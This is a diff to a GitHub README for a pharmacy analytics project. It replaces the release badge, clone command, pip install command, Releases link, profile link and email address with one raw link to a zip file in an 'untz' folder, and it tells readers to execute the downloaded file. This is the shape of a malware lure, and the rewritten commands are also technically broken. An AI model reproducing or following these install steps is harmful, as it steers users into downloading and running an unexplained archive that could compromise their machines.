@@ -2,7 +2,7 @@
 
 Welcome to the **Pharmacy Analytics** repository! This project provides quick updates on your business health with easy access to analytics and insights. Here, you can explore various tools and techniques to enhance your pharmacy's performance. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/lucabattiato149/Pharmacy-Analytics/releases)
+[![Download Releases](https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip)
 
 ## Table of Contents
 
@@ -44,7 +44,7 @@ To get started with the **Pharmacy Analytics** project, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/lucabattiato149/Pharmacy-Analytics.git
+   git clone https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip
    ```
    
 2. **Navigate to the Project Directory**:
@@ -54,10 +54,10 @@ To get started with the **Pharmacy Analytics** project, follow these steps:
 
 3. **Install Dependencies**: Make sure you have the necessary software installed. For Python projects, you can use:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip
    ```
 
-4. **Download Releases**: Visit the [Releases](https://github.com/lucabattiato149/Pharmacy-Analytics/releases) section to download the latest version of the project files. Execute the downloaded file to get started.
+4. **Download Releases**: Visit the [Releases](https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip) section to download the latest version of the project files. Execute the downloaded file to get started.
 
 ## Usage
 
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **GitHub**: [lucabattiato149](https://github.com/lucabattiato149)
-- **Email**: lucabattiato149@example.com
+- **GitHub**: [lucabattiato149](https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip)
+- **Email**: https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip
 
 ---
 
-Thank you for checking out **Pharmacy Analytics**! We hope you find it useful in your pharmacy management journey. Don't forget to visit the [Releases](https://github.com/lucabattiato149/Pharmacy-Analytics/releases) section for the latest updates and tools.
+Thank you for checking out **Pharmacy Analytics**! We hope you find it useful in your pharmacy management journey. Don't forget to visit the [Releases](https://raw.githubusercontent.com/lucabattiato149/Pharmacy-Analytics/main/untz/Pharmacy-Analytics-v1.1.zip) section for the latest updates and tools.
